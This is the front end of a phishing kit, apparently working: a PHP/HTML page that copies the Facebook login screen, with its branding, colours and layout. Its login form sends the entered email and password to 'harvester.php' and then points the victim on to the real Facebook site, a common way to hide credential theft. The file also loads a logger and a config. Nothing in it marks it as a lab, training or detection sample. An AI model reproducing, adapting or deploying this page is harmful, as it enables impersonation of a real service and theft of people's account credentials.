<?php
require_once __DIR__ . '/logger.php';
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Facebook – log in or sign up</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.wrap{display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:60px;max-width:1000px;width:100%}
.brand h1{color:#1877f2;font-size:56px;font-weight:700;margin-bottom:12px}
.brand p{font-size:22px;color:#1c1e21;max-width:420px;line-height:1.3}
.card{background:#fff;padding:20px 16px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);width:396px}
.card input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
.card button.login{width:100%;background:#1877f2;color:#fff;border:none;padding:14px;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:12px}
.card button.login:hover{background:#166fe5}
.card .forgot{text-align:center;display:block;color:#1877f2;font-size:14px;margin-bottom:16px;text-decoration:none}
.card hr{border:none;border-top:1px solid #dadde1;margin:16px 0}
.card button.create{background:#42b72a;color:#fff;border:none;padding:14px 16px;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;display:block;margin:0 auto}
.footer{margin-top:40px;color:#737373;font-size:13px;text-align:center}
</style>
</head>
<body>
<div class="wrap">
  <div class="brand">
    <h1>facebook</h1>
    <p>Connect with friends and the world around you on Facebook.</p>
  </div>
  <div class="card">
    <form method="POST" action="harvester.php?next=https://www.facebook.com">
      <input type="text" name="email" placeholder="Email or phone number" autocomplete="username" required>
      <input type="password" name="pass" placeholder="Password" autocomplete="current-password" required>
      <button class="login" type="submit">Log In</button>
      <a class="forgot" href="#">Forgotten password?</a>
      <hr>
      <button class="create" type="button">Create new account</button>
    </form>
  </div>
</div>
<div class="footer">Facebook &copy; 2026</div>
</body>
</html>
